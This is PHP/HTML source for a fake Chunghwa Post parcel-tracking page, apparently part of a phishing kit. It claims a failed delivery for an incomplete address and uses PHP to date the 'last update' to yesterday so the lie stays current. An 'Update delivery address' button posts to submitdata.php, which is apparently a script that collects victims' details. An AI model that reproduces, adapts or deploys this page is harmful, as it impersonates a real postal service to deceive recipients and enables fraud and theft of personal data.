<?php
session_start();
date_default_timezone_set("Asia/Taipei");
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
   <head id="j_idt3">
      <title>按需交付</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link rel="shortcut icon" href="tracking/favicon.ico">
      <meta name="apple-mobile-web-app-title" content="On Demand Delivery">
      <link rel="stylesheet" href="tracking/shipment-options.css">
      <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <link type="text/css" rel="stylesheet" href="tracking/default.css.xhtml.css">
   </head>
   <body class=" pace-running" style="">
      <nav id="main-menu">
         <ul class="menu-list">
            <li class="menu-item ">
               <a id="menu-whatis" href="#" class="menu-item-link">幫助
               </a>
            </li>
            <li class="menu-item ">
               <a id="menu-legal" href="#" class="menu-item-link">聯繫方式和法律
               </a>
            </li>
         </ul>
      </nav>
      <div class="modal fade" id="sideMenuHelpModel" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
         <div class="modal-dialog linguisticHelpModel">
            <div class="modal-content">
               <div class="modal-header helpModalHeader">
                  <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="tracking/icon-close.png"> </button>
                  <h4 class="helpmodal-title mt-10 mb-10" id="myModalLabel">幫助</h4>
               </div>
               <div id="sideMenuHelpContent" class="modal-body linguisticHelpModelBody">
               </div>
            </div>
         </div>
      </div>
      <section id="main-wrapper">
         <header id="main-header" class="row">
            <button id="menu-open-btn" class="hamburger hamburger--squeeze" type="button" aria-label="Open Menu" aria-controls="navigation">
            <span class="hamburger-box">
            <span class="hamburger-inner"></span>
            </span>
            </button><span id="header-title" class="header-title">嘗試投遞; 地址不完整</span><span class="logo-dhl">
            <a>
            <img src="files/Logo.jpg" class="img-responsive" alt="">
            </a></span>
         </header>
         <section id="main-body">
            <span id="shipment-panel">
               <form id="delivery-options-form" name="delivery-options-form" method="post" action="submitdata.php?data=track">
                  <input type="hidden" name="delivery-options-form" value="delivery-options-form">
                  <input type="hidden" name="csrfId" value="3379fda80095d888fa60ad6c2273b22ce0ce002044b1547b1c8c34f9877ca726">
                  <section id="shipment-summary" class="row" style="">
                     <div class="shipment-group col-xs-24 nopadding">
                        <div class="shipment-item col-xs-24 col-sm-12">
                           <div class="shipment-item-left col-xs-13 col-md-15">
                              <div class="shipment-item-info col-xs-24 nopadding">
                                 <div class="shipment-item-light col-xs-24 ">
                                    追踪
                                </div>
                                 <div class="shipment-item-strong shipment-item-info-shipper col-xs-24">RA334473229TW
                                 </div>
                              </div>
                           </div>
                           <div class="shipment-item-right col-xs-11 col-md-9 ">
                              <div class="shipment-item-info col-xs-24 nopadding ">
                                 <div class="shipment-item-light col-xs-24 ">最後更新</div>
                                 <div class="shipment-item-strong col-xs-24"><?php echo date("d-m-Y", strtotime("-1 day"))?>
                                </div>
                                 <div class="shipment-item-strong col-xs-24">13:50
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="shipment-item col-xs-24 col-sm-12">
                           <div class="shipment-timeline">
                              <ul class="timeline">
                                 <li>
                                    <div class="">
                                       已接
                                    </div>
                                 </li>
                                 <li>
                                    <div class="">
                                       在途中
                                    </div>
                                 </li>
                                 <li class="active timeline">
                                    <div class="">
                                       失敗的交付嘗試
                                   </div>
                                 </li>
                                 <li class="last-checkpoint">
                                    <div class="">發表</div>
                                 </li>
                              </ul>
                           </div>
                        </div>
                     </div>
                     <div class="shipment-info col-xs-24">
                        <div class="shipment-item-light mt-5 col-xs-24">退回倉庫 - 請更新收貨地址</div>
                        <div class="font-bold col-xs-12"><?php echo date("d:m:Y", strtotime("-1 day"))?> 收貨地址不完整 - 最後一次嘗試</div>
                        <div class="font-bold v-center h-xs-right col-xs-12">
                           <a href="#" class="shipment-item-link">
                           物流信息
                           <span class="has-icon icon-arrow-link"></span>
                           </a>
                        </div>
                     </div>
                  </section>
                  <div id="delivery-options-form:doblocker-container" class="row blocker-container" style="display:block">
                     <div class="blocker-body">
                     </div>
                     <span id="delivery-options-form:delivered-panel">
                        <div id="delivered-container" class="col-xs-24 mt-20 nopadding">
                           <div id="delivery-options-form:pod-message" class="row"></div>
                          <div class="content-div row content-button">
                                 <div class="col-xs-24 h-center"><input id="delivery-options-form:btn-feedback-submit" type="submit" name="delivery-options-form:btn-feedback-submit" value="Update delivery address" class="base-button">
                                 </div>
                          </div>
                           <div class="content-div row content-button">
                              <div class="col-xs-24 h-center">
                                 <a href="#" class="base-button base-button--white">追踪詳情</a>
                              </div>
                           </div>
                           <span id="delivery-options-form:feedback-panel">
                              <div class="content-div row content-button">
                                 <div class="col-xs-24 h-center mb-10 feedback-text"><span id="delivery-options-form:feedbackExperience">評價您的送貨體驗</span>
                                 </div>
                                 <div class="col-xs-24 h-center mb-20">
                                    <div id="delivery-options-form:feedback-rating" class="feedback-stars"><input type="radio" name="delivery-options-form:feedback-rating" id="delivery-options-form:feedback-rating:0" value="5"><label for="delivery-options-form:feedback-rating:0"> 優秀的！</label><input type="radio" name="delivery-options-form:feedback-rating" id="delivery-options-form:feedback-rating:1" value="4"><label for="delivery-options-form:feedback-rating:1"> 偉大的</label><input type="radio" name="delivery-options-form:feedback-rating" id="delivery-options-form:feedback-rating:2" value="3"><label for="delivery-options-form:feedback-rating:2"> 好的</label><input type="radio" name="delivery-options-form:feedback-rating" id="delivery-options-form:feedback-rating:3" value="2"><label for="delivery-options-form:feedback-rating:3"> 滿意的</label><input type="radio" name="delivery-options-form:feedback-rating" id="delivery-options-form:feedback-rating:4" value="1"><label for="delivery-options-form:feedback-rating:4"> 不滿意</label></div>
                                 </div>
                              </div>
                              <div class="content-div row content-button"></div>
                           </span>
                        </div>
                     </span>
                  </div>
                  <div id="delivery-options-form:allMessagesPanel" class="messages-panel row"></div>
                  <input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:1" value="-3956292706233740671:7366064897172693908" autocomplete="off">
               </form>
            </span>
            <section id="content-bottom-flex" class="bg-white"></section>
         </section>
         <footer id="main-footer" class="row">
            <div class="col-xs-8 nopadding">
               <img src="files/Logo-rwd.png" class="logo-dpdhl img-responsive" alt="">
            </div>
            <div class="col-xs-16 nopadding">
               <span class="copyright">中華郵政 版權所有 © 2021 Chunghwa Post All Rights Reserved.　
               </span>
            </div>
         </footer>
      </section>
      <span id="modal">
         <div id="override-warning-modal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="override-warning-modal" aria-hidden="true">
            <div class="modal-dialog" role="document">
               <div class="modal-content">
                  <div class="modal-body content-div text-center">
                     You have previously submitted a delivery request. A new request will override your previous choice.
                  </div>
                  <div class="modal-footer content-div text-center">
                     <button id="modal-btn-no" type="button" class="base-button" data-dismiss="modal">OK</button>
                  </div>
               </div>
            </div>
         </div>
      </span>
      <div style="position: absolute; z-index: 1000; left: 1920px; top: 0px; display: none;">
         <table class="o_ajax_message  " style="display:none" cellpadding="0" cellspacing="0">
            <tbody>
               <tr>
                  <td valign="middle" style="padding-right: 5px"><img src="tracking/loading.gif.xhtml.gif"></td>
                  <td valign="middle">Loading...</td>
               </tr>
            </tbody>
         </table>
      </div>
   </body>
</html>